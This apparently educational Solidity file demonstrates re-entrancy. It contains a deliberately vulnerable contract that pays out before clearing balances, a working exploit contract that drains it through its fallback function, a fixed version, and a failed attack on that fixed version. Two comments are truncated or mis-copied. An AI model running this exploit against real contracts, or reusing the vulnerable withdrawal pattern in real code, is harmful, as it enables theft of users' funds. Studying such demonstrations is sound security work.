pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

// @dev Insecure contract with re-entrancy exploit.
contract InsecureContract {
    // @dev Mapping of user balances.
    mapping (address => uint) private userBalances;

    // @dev Fallback function to receive ETH
    receive() external payable {
        userBalances[msg.sender] += msg.value;
    }

    // @dev Function exposed to re-entrancy attack.
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success);
        userBalances[msg.sender] = 0;
    }
}

// @dev Contract that successfully exploits re-entrancy contract.
contract ExploitContractSuccess is Ownable {
    InsecureContract private ic;

    // @dev Set contract address.
    function setInsecureContractAddress(address payable addr) public onlyOwner {
        ic = InsecureContract(addr);
    }

    // @dev Helper function to execute balance withdrawal.
    function executeWithdrawal() public onlyOwner {
        ic.withdrawBalance();
    }

    // @dev Call withdrawBalance within fallback function to abuse re-entrancy
    receive() external payable {
        if (msg.sender == address(ic) && address(ic).balance >= 1 ether) {
            ic.withdrawBalance();
        } else {
            // forward ether to the insecure contract
            (bool success, ) = address(ic).call{value: msg.value}("");
            require (success);
        }
    }
}

// @dev Secure contract protected against re-entrancy exploit.
contract SecureContract {
    // @dev Mapping of user balances.
    mapping (address => uint) private userBalances;

    // @dev Fallback function to receive ETH
    receive() external payable {
        userBalances[msg.sender] += msg.value;
    }

    // @dev Function protected from re-entrancy attack.
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        require(amountToWithdraw > 0, "Require non-negative balance.");
        userBalances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success);
    }
}

// @dev Contract that successfully
contract ExploitContractFailure is Ownable {
    SecureContract private sc;

    // @dev Set contract address.
    function setSecureContractAddress(address payable addr) public onlyOwner {
        sc = SecureContract(addr);
    }

    // @dev Helper function to execute balance withdrawal.
    function executeWithdrawal() public onlyOwner {
        sc.withdrawBalance();
    }

    // @dev Call withdrawBalance within fallback function to abuse re-entrancy
    receive() external payable {
        if (msg.sender == address(sc) && address(sc).balance >= 1 ether) {
            sc.withdrawBalance();
        } else {
            // forward ether to the insecure contract
            (bool success, ) = address(sc).call{value: msg.value}("");
            require (success);
        }
    }
}
